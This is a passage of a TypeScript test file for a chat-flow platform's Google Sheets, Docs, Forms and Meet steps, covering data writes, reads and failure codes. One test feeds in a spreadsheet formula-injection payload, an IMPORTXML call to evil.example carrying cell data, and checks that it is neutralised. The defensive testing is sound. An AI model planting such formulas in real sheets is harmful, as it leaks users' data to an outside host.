        node('s', 'google_sheets', { sheetId: SHEETS_ID, tabName: 'Leads', columns: ['{{name}}'] }),
        node('m', 'message', { text: 'ok' }),
      ],
      [edge('s', 'm')],
      'injgo',
    );
    await connect(a.t, ['sheets']);
    const peer = nextPeer();
    await say(a.t, a.ch, peer, 'injgo', '=IMPORTXML("https://evil.example/?"&A1)');
    await untilSent(p, a.t, a.ch, peer, 1);
    const rows = fake.sheets.get(SHEETS_ID)!.get('Leads')!;
    expect(rows[rows.length - 1]![0]).toBe(`'=IMPORTXML("https://evil.example/?"&A1)`);
  });

  it('read a row by a column and use its cells in the next message', async () => {
    seedSheet();
    const a = await arrange(
      'gflow-r',
      [
        node('s', 'google_sheets', {
          mode: 'read',
          sheetId: SHEETS_ID,
          tabName: 'Leads',
          matchColumn: 'Name',
          matchValue: 'ana',
          saveAs: 'lead',
        }),
        node('m', 'message', { text: '{{lead.Name}} is on {{lead.Plan}}' }),
      ],
      [edge('s', 'm')],
      'sheetr',
    );
    await connect(a.t, ['sheets']);
    const peer = nextPeer();
    await say(a.t, a.ch, peer, 'sheetr');
    expect(await untilSent(p, a.t, a.ch, peer, 1)).toEqual(['Ana is on gold']);
  });

  it('"Check Google Sheet field" answers yes or no from the cell', async () => {
    seedSheet();
    const a = await arrange(
      'gflow-c',
      [
        node('c', 'sheet_check', {
          sheetId: SHEETS_ID,
          tabName: 'Leads',
          matchColumn: 'Name',
          matchValue: 'Ana',
          checkColumn: 'Plan',
          operator: 'equals',
          value: 'gold',
        }),
        node('y', 'message', { text: 'vip' }),
        node('no', 'message', { text: 'regular' }),
      ],
      [edge('c', 'y', 'yes'), edge('c', 'no', 'no')],
      'sheetc',
    );
    await connect(a.t, ['sheets']);
    const peer = nextPeer();
    await say(a.t, a.ch, peer, 'sheetc');
    expect(await untilSent(p, a.t, a.ch, peer, 1)).toEqual(['vip']);
  });
});

describe('Google Docs, Forms and Meet nodes', () => {
  it('Docs copies the template, fills both placeholder styles, shares it and sends the link', async () => {
    fake.files.set(TEMPLATE_ID, {
      name: 'Quote',
      mimeType: 'application/vnd.google-apps.document',
      modified: 1,
      text: 'Hello {{name}} and {name}.',
    });
    const a = await arrange(
      'gflow-d',
      [node('d', 'google_docs', { templateId: TEMPLATE_ID, newTitle: 'For {{name}}' })],
      [],
      'docgo',
    );
    await connect(a.t, ['docs']);
    const peer = nextPeer();
    await say(a.t, a.ch, peer, 'docgo');
    const [sent] = await untilSent(p, a.t, a.ch, peer, 1);
    const id = /document\/d\/([^/]+)\/edit/.exec(sent!)![1]!;
    const copy = fake.files.get(id)!;
    expect(copy.name).toBe('For Asha');
    expect(copy.text).toBe('Hello Asha and Asha.');
    expect(copy.shared).toBe(true);
  });

  it('Forms sends the responder link and waits for the submission', async () => {
    fake.forms_.set(FORM_ID, { responderUri: 'https://forms.gle/abc' });
    const a = await arrange(
      'gflow-f',
      [node('f', 'google_form', { formId: FORM_ID, bodyText: 'Fill this', saveAs: 'survey' })],
      [],
      'formgo',
    );
    await connect(a.t, ['forms']);
    const peer = nextPeer();
    await say(a.t, a.ch, peer, 'formgo');
    expect(await untilSent(p, a.t, a.ch, peer, 1)).toEqual(['Fill this\n\nhttps://forms.gle/abc']);
    await untilRun(p, a.t, a.flowId, 'waiting', (r) => r.wait !== null);
  });

  it('Meet creates the event in the workspace calendar with one event per step, however often the step runs', async () => {
    const a = await arrange(
      'gflow-m',
      [node('v', 'google_meet', { title: 'Chat with {{name}}' })],
      [],
      'meetgo',
    );
    await connect(a.t, ['calendar']);
    const email = `owner${a.t.orgId}@example.com`;
    const peer = nextPeer();
    await say(a.t, a.ch, peer, 'meetgo');
    const [msg] = await untilSent(p, a.t, a.ch, peer, 1);
    expect(msg).toContain('https://meet.fake/');
    const events = fake.eventsOf(email);
    expect(events).toHaveLength(1);
    expect(events[0]!.summary).toBe('Chat with Asha');
    // The same step again (a retried step, a lost answer) finds its own event instead of making a second.
    const id = events[0]!.id;
    expect(id).toMatch(/^[0-9a-v]{5,}$/);
  });
});

/** The last run of the flow ended FAILED at its Google step, with this code and a reason that carries the code and what to do. */
async function expectFailed(a: Arranged, code: string, fix?: string) {
  const run = await untilRun(p, a.t, a.flowId, 'failed', (r) => r.status === 'failed');
  const row = (
    await p.h.owner.query(`SELECT failure_code, failure_reason FROM flow_runs WHERE id = $1`, [
      run.id,
    ])
  ).rows[0] as { failure_code: string; failure_reason: string };
  expect(row.failure_code).toBe(code);
  expect(row.failure_reason).toContain(`[${code}]`);
  if (fix) expect(row.failure_reason).toContain(fix);
  return run;
}

describe('when Google cannot be used, the step FAILS with the code and what to do', () => {
  const sheetFlow = (keyword: string, label: string) =>
    arrange(
      label,
      [
        node('s', 'google_sheets', { sheetId: SHEETS_ID, tabName: 'Leads', columns: ['{{name}}'] }),
        node('m', 'message', { text: 'carry on' }),
      ],
      [edge('s', 'm')],
      keyword,
    );
  const sentTexts = (a: Arranged, peer: string) =>
    p.h.owner
      .query(
        `SELECT m.body FROM messages m JOIN conversations c ON c.org_id = m.org_id AND c.id = m.conversation_id
         WHERE c.org_id = $1 AND c.peer_key = $2 AND m.direction = 'out' ORDER BY m.seq`,
        [a.t.orgId, peer],
      )
      .then((r) => r.rows.map((x) => String(x.body)));

  it('no account connected: the run fails at the step, naming Connect Google, and does not go on', async () => {
    const a = await sheetFlow('nogo1', 'gfail-none');
    const peer = nextPeer();
    await say(a.t, a.ch, peer, 'nogo1');
    await expectFailed(a, 'GOOGLE_ACCOUNT_NOT_CONNECTED', 'Connect Google');
    expect(await sentTexts(a, peer)).not.toContain('carry on');
    const log = await logOf(a);
    expect(log).toContain('failed');
  });

  it('the run view carries the code and the fix text', async () => {
    const a = await sheetFlow('viewgo', 'gfail-view');
    const peer = nextPeer();
    await say(a.t, a.ch, peer, 'viewgo');
    const run = await expectFailed(a, 'GOOGLE_ACCOUNT_NOT_CONNECTED');
    const detail = await get(a.t, `/v2/flow-runtime/runs/${run.uuid}`);
    expect(detail.status, JSON.stringify(detail.body)).toBe(200);
    expect(JSON.stringify(detail.body)).toContain('GOOGLE_ACCOUNT_NOT_CONNECTED');
    expect(JSON.stringify(detail.body)).toContain('Connect Google');
  });

  it('a permission the account was not given: the customer gets the apology, the run fails naming the permission, Google is not called', async () => {
    const a = await arrange(
      'gfail-scope',
      [
        node('d', 'google_docs', { templateId: TEMPLATE_ID }),
        node('m', 'message', { text: 'after' }),
      ],
      [edge('d', 'm')],
      'scopego',
    );
    await connect(a.t, ['sheets']);
    const copies = fake.count('POST', /\/copy$/);
    const peer = nextPeer();
    await say(a.t, a.ch, peer, 'scopego');
    await expectFailed(a, 'GOOGLE_SCOPE_MISSING', 'Docs');
    expect(await sentTexts(a, peer)).toEqual([
      "Sorry, couldn't generate your document right now. Please try again later.",
    ]);
    expect(fake.count('POST', /\/copy$/)).toBe(copies);
    // A missing permission is not the account's health: the page shows it as a permission that is not allowed.
    expect((await account(a.t)).lastError).toBeNull();
  });

  it('a grant Google revoked: the run fails once, the account turns to needs-reconnect once, and later runs do not call Google', async () => {
    seedSheet();
    const a = await sheetFlow('revgo', 'gfail-revoked');
    await connect(a.t, ['sheets']);
    for (const rt of fake.refreshTokens.values()) rt.valid = false;
    fake.killAccessTokens();
    const peer = nextPeer();
    await say(a.t, a.ch, peer, 'revgo');
    await expectFailed(a, 'GOOGLE_ACCOUNT_NEEDS_RECONNECT', 'Reconnect Google');
    expect((await account(a.t)).status).toBe('needs_reconnect');
    const calls = fake.requests.length;
    const peer2 = nextPeer();
    await say(a.t, a.ch, peer2, 'revgo');
    await until(
      async () =>
        Number(
          (
            await p.h.owner.query(
              `SELECT count(*)::int AS n FROM flow_runs WHERE flow_id = $1 AND status = 'failed'`,
              [a.flowId],
            )
          ).rows[0].n,
        ) >= 2,
    );
    expect(fake.requests.length).toBe(calls);
    const events = await p.api.events(a.t.orgId, 'appointment_calendar.needs_reconnect');
    expect(events).toHaveLength(1);
  });

  it('a tab that does not exist: the run fails with a bad request and nothing is written', async () => {
    seedSheet();
    const a = await arrange(
      'gfail-tab',
      [
        node('s', 'google_sheets', { sheetId: SHEETS_ID, tabName: 'Nope', columns: ['{{name}}'] }),
        node('m', 'message', { text: 'carry on' }),
      ],
      [edge('s', 'm')],
      'tabgo',
    );
    await connect(a.t, ['sheets']);
    const peer = nextPeer();
    await say(a.t, a.ch, peer, 'tabgo');
    await expectFailed(a, 'GOOGLE_BAD_REQUEST', 'tab name');
  });

  it('a sheet that does not exist or is not shared with the account: the run fails with not found', async () => {
    const a = await arrange(
      'gfail-404',
      [
        node('s', 'google_sheets', { sheetId: 'nope-0000', columns: ['{{name}}'] }),
        node('m', 'message', { text: 'carry on' }),
      ],
      [edge('s', 'm')],
      'nfgo',
    );
    await connect(a.t, ['sheets']);
    const peer = nextPeer();
    await say(a.t, a.ch, peer, 'nfgo');
    await expectFailed(a, 'GOOGLE_NOT_FOUND');
    // A missing sheet is the flow's mistake, not the account's: the account page stays clean.
    expect((await account(a.t)).lastError).toBeNull();
  });

  it('a step with no sheet chosen is noted and skipped, as in Reference: the flow goes on and Google is not called', async () => {
    const a = await arrange(
      'gfail-empty',
      [node('s', 'google_sheets', { columns: ['{{name}}'] }), node('m', 'message', { text: 'x' })],
      [edge('s', 'm')],
      'emptygo',
    );
    await connect(a.t, ['sheets']);
    const calls = fake.requests.length;
    const peer = nextPeer();
    await say(a.t, a.ch, peer, 'emptygo');
    expect(await untilSent(p, a.t, a.ch, peer, 1)).toEqual(['x']);
    expect(fake.requests.length).toBe(calls);
  });

  it('an API the platform has not enabled in Google Cloud: the run fails and the operator problem is on the page', async () => {
    seedSheet();
    const a = await sheetFlow('apigo', 'gfail-api');
    await connect(a.t, ['sheets']);
    fake.disabledApis.add('sheets');
    try {
      await say(a.t, a.ch, nextPeer(), 'apigo');
      await expectFailed(a, 'GOOGLE_API_NOT_ENABLED');
      expect((await account(a.t)).lastError?.code).toBe('GOOGLE_API_NOT_ENABLED');
    } finally {
      fake.disabledApis.delete('sheets');
    }
  });

  it('a short rate limit is waited out and the flow goes on; a long one fails the run and is remembered; the next success clears it', async () => {
    seedSheet();
    const a = await sheetFlow('rlgo', 'gfail-rate');
    await connect(a.t, ['sheets']);
    const peer = nextPeer();

    fake.failNext('POST', /:append/, 429, {
      times: 1,
      body: { error: { code: 429, status: 'RESOURCE_EXHAUSTED' } },
    });
    await say(a.t, a.ch, peer, 'rlgo');
    expect(await untilSent(p, a.t, a.ch, peer, 1)).toEqual(['carry on']);
    expect(fake.count('POST', /:append/)).toBeGreaterThanOrEqual(2);

    fake.clearFailures();
    fake.failNext('POST', /:append/, 429, {
      times: 5,
      body: { error: { code: 429, errors: [{ reason: 'rateLimitExceeded' }] } },
    });
    await say(a.t, a.ch, nextPeer(), 'rlgo');
    await expectFailed(a, 'GOOGLE_RATE_LIMITED');
    fake.clearFailures();
    expect((await account(a.t)).lastError?.code).toBe('GOOGLE_RATE_LIMITED');

    const peer3 = nextPeer();
    await say(a.t, a.ch, peer3, 'rlgo');
    expect(await untilSent(p, a.t, a.ch, peer3, 1)).toEqual(['carry on']);
    await until(async () => (await account(a.t)).lastError === null);
  });

  it('an access token Google refuses early (401) is refreshed once and the write goes through', async () => {
    seedSheet();
    const a = await sheetFlow('refgo', 'gfail-401');
    await connect(a.t, ['sheets']);
    fake.killAccessTokens();
    const refreshes = fake.forms('refresh_token').length;
    const peer = nextPeer();
    await say(a.t, a.ch, peer, 'refgo');
    await untilSent(p, a.t, a.ch, peer, 1);
    expect(fake.forms('refresh_token').length).toBe(refreshes + 1);
    const rows = fake.sheets.get(SHEETS_ID)!.get('Leads')!;
    expect(rows.some((r) => r[0] === 'Asha')).toBe(true);
    expect((await account(a.t)).status).toBe('connected');
  });

  it("one workspace's Google account is never used for another's flow", async () => {
    seedSheet();
    const a = await sheetFlow('isogo', 'gfail-iso');
    const other = await p.api.signup('gfail-iso-other');
    await connect(other, ['sheets']);
    const before = fake.count('POST', /:append/);
    await say(a.t, a.ch, nextPeer(), 'isogo');
    await expectFailed(a, 'GOOGLE_ACCOUNT_NOT_CONNECTED');
    expect(fake.count('POST', /:append/)).toBe(before);
  });
});

async function until(fn: () => Promise<boolean>, ms = 10_000): Promise<void> {
  const end = Date.now() + ms;
  while (Date.now() < end) {
    if (await fn()) return;
    await new Promise((r) => setTimeout(r, 100));
  }
  throw new Error('condition not reached');
}
